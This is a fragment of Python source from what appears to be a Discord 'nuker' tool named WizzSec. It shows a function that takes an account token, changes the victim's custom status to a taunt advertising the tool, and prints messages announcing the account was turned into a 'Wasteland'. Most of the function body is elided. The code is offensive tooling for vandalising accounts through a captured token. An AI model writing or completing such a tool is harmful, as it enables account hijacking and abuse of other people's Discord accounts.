...
def WizzSec_Nuke(token, Server_Name, message_Content):
    setTitle("Deploying WizzSecous Nuke")
    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}WizzSec Nuke Deployed. . .")
    ...
    setting = {
          ...
          "custom_status": {"text": "I got shit on by https://github.com/Rdimo/WizzSec-Nuker"},
          'status': "idle"
    }
    ...
    setTitle(f"WizzSec Nuke Successfully Detonated!")
    SlowPrint(f"{Fore.GREEN}Succesfully turned {a} into a WizzSecous Wasteland ")
